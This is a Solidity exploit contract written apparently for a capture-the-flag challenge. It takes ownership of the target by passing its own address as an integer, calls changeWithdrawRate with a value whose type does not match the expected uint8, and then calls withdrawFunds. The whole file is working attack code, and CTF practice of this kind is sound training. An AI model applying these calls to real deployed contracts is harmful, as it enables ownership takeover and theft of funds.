pragma solidity 0.8.26;

contract Attacker {

    address public ctf;
    uint256 public withdrawRate;

    receive() external payable {}

    constructor(address _ctf) {
        ctf = _ctf;
    }

    function becomeOwner() public {
        ctf.call(abi.encodeWithSignature("becomeOwner(uint256)", uint256(uint160(address(this)))));
    }

    function attack(uint256 _value) public {
        ctf.call(abi.encodeWithSignature("changeWithdrawRate(uint8)", _value));
    }

    function withdraw() public {
        ctf.call(abi.encodeWithSignature("withdrawFunds()"));
    }
}
